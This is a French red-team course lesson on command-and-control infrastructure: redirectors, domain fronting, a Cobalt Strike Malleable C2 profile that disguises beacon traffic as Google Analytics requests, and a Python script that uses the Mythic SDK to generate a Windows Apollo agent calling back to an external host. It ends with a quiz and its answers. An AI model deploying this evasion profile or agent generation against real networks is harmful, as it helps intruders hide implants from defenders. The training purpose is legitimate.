# TOME P6 — Cybersécurité Expert & Red Team Avancé — Jour 296 (6h) : Red Team Operations & C2 Infrastructure (Cobalt Strike, Mythic C2, Malleable C2 Profiles, Domain Fronting & Redirectors)

> [!NOTE]
> **Objectif du jour :** Maîtriser le **déploiement et la gestion d'une infrastructure de Command & Control (C2) de niveau professionnel** ciblée par la certification **CRTO** : déployer le framework open-source **Mythic C2** et Cobalt Strike, rédiger des profils **Malleable C2** pour masquer les communications sous du trafic légitime (ex: Amazon, Google), et configurer des **Redirectors (Nginx/Apache)** et du **Domain Fronting**.
>
> **Compétences visées :** `RED-05` (A) — Command & Control (C2) Infrastructure | `RED-06` (A) — Malleable C2 Profiles & Traffic Masking

---

## 1) Module — Architecture d'Infrastructure Red Team & Redirectors (2h)

### 📖 Narration/Intuition

Dans une opération Red Team professionnelle, le serveur C2 principal (**Teamserver**) ne doit JAMAIS être directement exposé sur Internet. Si l'équipe Blue Team ou le SOC identifie et bloque l'IP du C2, l'opération est compromise. On intercale donc des **Redirectors** (proxies inverses Nginx/Apache) et des CDN (Cloudflare, AWS CloudFront) utilisant le **Domain Fronting** pour masquer l'infrastructure réelle.

```
[ Target Victim ] ──(HTTP/HTTPS Malleable)──► [ CDN / Domain Fronting (Cloudflare) ]
                                                         │
                                                [ Redirector Nginx ] (Filtering Bad Traffic)
                                                         │
                                                [ Teamserver C2 (Mythic / Cobalt Strike) ]
```

---

## 2) Module — Profil Malleable C2 Cobalt Strike / Mythic (`malleable_profile.profile`) (2h)

### 🛠️ Atelier Pratique — Profil Malleable masquant le Beaconing sous du trafic Google Analytics

```text
# Malleable C2 Profile — Masquage sous forme de requêtes Google Analytics

set sample_name "Google Analytics Masking";

set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

# Configuration du Sleep (Beaconing)
set sleeptime "60000"; # 60 secondes
set jitter    "15";    # 15% de variation aléatoire pour briser la périodicité stricte !

# Configuration de la requête HTTP GET (Poll de commandes)
http-get {
    set uri "/analytics/collect";

    client {
        header "Host" "www.google-analytics.com";
        header "Accept-Language" "en-US,en;q=0.9";

        metadata {
            base64url;
            prepend "tid=UA-123456-1&v=1&cid=";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/javascript";
        header "Server" "Google Frontend";

        output {
            prepend "window.ga=window.ga||function(){};";
            print;
        }
    }
}
```

---

## 3) Module — Automation du déploiement Mythic C2 avec Python (`mythic_c2_api.py`) (2h)

```python
from mythic import mythic

# Automation de la plateforme Mythic C2 via l'API GraphQL / Python SDK

async def setup_mythic_operation():
    print("[*] Connexion à l'instance Mythic C2...")
    # Authentification auprès du serveur Mythic
    mythic_instance = await mythic.login(
        username="mythic_admin",
        password="MySecretPassword123!",
        server_ip="127.0.0.1",
        server_port=7443
    )

    print("[+] Connexion établie avec succès !")

    # Générer un Payload Poseidon (Go) ou Apollo (C#)
    print("[*] Génération de l'agent C2 Apollo (.exe)...")
    payload = await mythic.create_payload(
        mythic=mythic_instance,
        payload_type="apollo",
        operating_system="Windows",
        c2_profiles=[{"c2_profile": "http", "c2_profile_parameters": {"callback_host": "https://cdn.company-test.com"}}]
    )
    print(f"[+] Agent C2 généré avec succès ! Payload UUID : {payload['uuid']}")

# Exécution de l'automatisation
# import asyncio; asyncio.run(setup_mythic_operation())
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **C2 / C&C** | Command and Control — Infrastructure de pilotage à distance d'implants/beacons Red Team |
| **Mythic** | Framework C2 open-source multi-plateformes et multi-agents (C#, Go, Python) |
| **Domain Fronting** | Technique utilisant des CDN de confiance pour masquer le domaine C2 réel dans l'entête SNI |
| **Malleable C2** | Langage de configuration de Cobalt Strike permettant de sculpter l'empreinte réseau du C2 |

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quelle est la fonction principale d'un **Redirector (Proxy Inverse)** dans une infrastructure Red Team d'entreprise ?
- A) Intercaler un serveur proxy filtrant entre les victimes et le Teamserver C2 principal pour masquer l'IP réelle du serveur de commande et bloquer le trafic des chercheurs en sécurité
- B) Chiffrer la base de données SQL
- C) Accélérer le téléchargement des fichiers
- D) Remplacer le pare-feu

**Réponse : A**

**Q2 :** Quel est le rôle d'un profil **Malleable C2** dans le framework Cobalt Strike ou Mythic ?
- A) Personnaliser et sculpter les requêtes réseau (HTTP headers, URIs, cookies) émises par le Beacon pour imiter à 100% du trafic légitime (ex: Google Analytics, Amazon) et déjouer les détections SIEM/NIDS
- B) Modifier la couleur de l'interface graphique
- C) Supprimer les fichiers de logs
- D) Générer des mots de passe

**Réponse : A**

**Q3 :** Pourquoi configure-t-on un paramètre de **Jitter** (ex: 15%) sur l'intervalle de Sleep d'un agent Red Team C2 ?
- A) Pour introduire une variation aléatoire dans le délai entre chaque connexion réseau, brisant ainsi la périodicité stricte et déjouant la détection statistique de Beaconing
- B) Pour augmenter la vitesse d'exfiltration
- C) Pour réduire la taille du fichier exécutable
- D) Pour économiser de la batterie

**Réponse : A**

**Q4 :** Quel framework C2 moderne et open-source basé sur une architecture d'agents modulaire (Apollo, Poseidon, Athena) est l'alternative de choix à Cobalt Strike ?
- A) Mythic C2
- B) Metasploit
- C) Nmap
- D) Wireshark

**Réponse : A**

**Q5 :** En quoi consiste la technique de **Domain Fronting** ?
- A) Abuser des mécanismes de routage des réseaux de distribution de contenu (CDN) en utilisant un domaine de confiance dans la poignée de main TLS (SNI) tout en ciblant un autre domaine dans le header HTTP `Host`
- B) Acheter des noms de domaine expirer
- C) Modifier le fichier `/etc/hosts` de la victime
- D) Pirater le serveur DNS racine

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
